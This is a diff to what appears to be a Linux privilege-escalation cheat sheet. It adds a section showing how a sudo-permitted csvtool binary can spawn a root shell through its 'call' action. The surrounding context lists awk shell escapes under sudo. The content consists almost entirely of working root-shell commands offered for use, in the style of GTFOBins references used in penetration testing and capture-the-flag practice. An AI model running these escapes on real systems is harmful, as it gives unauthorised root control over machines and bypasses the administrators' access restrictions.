@@ -937,6 +937,20 @@ sudo awk 'BEGIN {system("/bin/bash")}'
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
+### csvtool
+
+If `sudo -l` allows `csvtool`, use the `call` action to execute a command as root:
+
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/bin/csvtool
+
+sudo /usr/bin/csvtool call '/bin/sh;false' /etc/passwd
+id
+```
+
+Reference: https://gtfobins.github.io/gtfobins/csvtool/
+
 ### less
 
 ```
